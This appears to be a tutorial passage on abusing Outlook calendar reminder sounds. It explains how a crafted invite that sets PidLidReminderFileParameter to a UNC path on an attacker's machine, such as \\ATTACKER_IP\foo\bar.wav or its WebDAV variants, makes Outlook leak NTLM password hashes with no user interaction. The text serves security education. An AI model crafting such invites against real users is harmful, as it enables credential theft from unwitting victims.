You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event. Typically, this would be used for a user to set up their own notifications by pointing to an audio file:

Manipulating this parameter can enable a threat actor to force Outlook to leak the current password hashes to an attacker with zero interaction required.

Abusing Reminder Sounds via UNC Paths  

To exploit this vulnerability, create a malicious calendar invitation that includes a reference to a sound file.
This sound file ==must point to a file in a network share in the attacker's machine.== At a low level, an Outlook email stores the reference to the sound file in an internal parameter called **PidLidReminderFileParameter**. To ensure that the audio we embed in our malicious email will take precedence over the victim's default reminder configurations, we will also need to set another parameter called **PidLidReminderOverride** to `true`


o set up the **PidLidReminderFileParameter** property to point to a network share, the attacker can specify a **Universal Naming Convention (UNC)** path instead of a local file. UNC is used in Windows operating systems to find network resources (files, printers, shared documents). These paths consist of a double backslash, ==the IP address== *or* ==name== of the computer hosting the resource, the share name and the file name. For example:

`\\ATTACKER_IP\foo\bar.wav`


- If for some reason the SMB protocol isn't a viable alternative to use,

- non-server versions of Windows will accept using **UNC paths pointing to ports 80 or 443**, and use HTTP to retrieve the file from a WebDAV-enabled web server. The syntax of such UNC path is as follows:

`\\ATTACKER_IP@80\foo\bar.wav`

`\\ATTACKER_IP@443\foo\bar.wav`
